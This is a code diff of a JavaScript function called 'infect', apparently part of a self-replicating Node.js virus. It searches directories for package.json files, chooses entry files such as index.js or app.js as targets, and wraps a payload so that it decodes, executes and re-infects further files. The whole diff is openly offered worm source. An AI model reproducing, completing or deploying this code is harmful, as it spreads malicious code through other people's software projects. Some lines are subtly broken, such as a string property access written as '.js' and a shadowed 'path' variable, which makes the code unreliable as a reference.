@@ -4,6 +4,18 @@ async function infect( payload ) {
     const os   = require( "os" );
     const path = require( "path" );
 
+    // the original payload, modified with a runner that decodes and executes it
+    // this is the string that will be injected into our targets
+
+    const modifiedPayload = `
+        (function() {
+            ${decodeURI(payload)} 
+            infect( "${payload}" );
+        })();
+    `;
+
+    // wrapped standard file-system methods in promises so we can use await/async syntax
+
     function readFile( f ) {
         return new Promise( function( rs, rj ) {
             fs.readFile( f, (e,r) => e ? rj( e ) : rs( r ) );
@@ -28,12 +40,23 @@ async function infect( payload ) {
         });
     }
 
-    const modifiedPayload = `
-        (function() {
-            ${decodeURI(payload)} 
-            infect( "${payload}" );
-        })();
-    `;
+    // utility function to find a file that exists out of a candidate list
+    // used when searching for the actual file to infect
+
+    async function getCandidate( root, candidates ) {
+        for( var candidate of candidates ) {
+            var path = path.join( root, candidate );
+            try {
+                await stat( path );
+                return path;
+            } catch( e ) {
+                continue;
+            }
+        }
+
+        // no candidate file found - we lose
+        return null;
+    }
 
     async function search( dir ) {
 
@@ -47,9 +70,15 @@ async function infect( payload ) {
                 if( fStat.isFile() ) {
                     if( f === "package.json" ) {
                         foundPackage = true;
-                        let data = JSON.parse( await readFile( full ) );
-                        let target = path.join( dir, data.main || "index.js" );
-                        await stat( target );
+                        let packageJson = JSON.parse( await readFile( full ) );
+
+                        // candidate file names in order of preference:
+                        let candidates = [ "index.js", `${packageJson.name}`.js, "app.js", packageJson.main ].filter( x => x );
+                        let target = await getCandidate( dir, candidates );
+
+                        // abort this project if we can't find a target to infect
+                        if( !target )
+                            continue;
                         filesToInfect.push( target );
                     }
                 } else if( fStat.isDirectory() ) {
